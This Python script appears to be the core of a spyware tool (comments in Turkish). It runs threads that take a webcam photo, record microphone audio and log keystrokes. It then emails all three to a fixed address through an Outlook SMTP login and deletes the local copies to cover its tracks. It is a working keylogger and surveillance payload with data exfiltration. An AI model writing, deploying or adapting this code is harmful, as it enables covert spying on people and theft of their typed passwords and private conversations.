import os
import smtplib
import threading
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import cam
import key
import sound

from dotenv import load_dotenv

load_dotenv()

fromMail=os.getenv("fromMail")
fromPassword=os.getenv("fromPassword")
toMail=os.getenv("toMail")

# time
a = time.localtime()
sysdate = str(a.tm_mday) + "." + str(a.tm_mon) + "." + str(a.tm_year) + "  " + str(a.tm_hour) + ":" + str(
    a.tm_min) + ":" + str(a.tm_sec)

names = "host"
num = 20

t1 = threading.Thread(target=cam.cams, args=(names + ".jpg",))  # cam
t2 = threading.Thread(target=sound.record, args=(names + ".wav", num - 10))  # ses
t3 = threading.Thread(target=key.runkey, args=(names + ".txt", num))  # key

t1.start()
t2.start()
t3.start()

t1.join()
t2.join()
t3.join()

# login
mail = smtplib.SMTP("smtp-mail.outlook.com", 587)
mail.ehlo()
mail.starttls()
mail.login(fromMail, fromPassword)
mesaj = MIMEMultipart()
mesaj["From"] = fromMail
mesaj["To"] = toMail
mesaj["Subject"] = os.getlogin() + " Logged In"

# cam
part = MIMEBase('application', "octet-stream")
part.set_payload(open(names + ".jpg", "rb").read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', 'attachment; filename=' + names + '.jpg"')
mesaj.attach(part)

# ses
part = MIMEBase('application', "octet-stream")
part.set_payload(open(names + ".wav", "rb").read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', 'attachment; filename=' + names + '.wav')
mesaj.attach(part)

# key
part = MIMEBase('application', "octet-stream")
part.set_payload(open(names + ".txt", "rb").read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', 'attachment; filename=' + names + '.txt')
mesaj.attach(part)

# tarih
mesaj.attach(MIMEText('<p;">' + sysdate + '</p> ', "html"))
mail.sendmail(mesaj["From"], mesaj["To"], mesaj.as_string())
mail.close()

# mail atıldıktan sonra oluşturulan dosyaları silme
os.remove(names + ".wav")
os.remove(names + ".jpg")
os.remove(names + ".txt")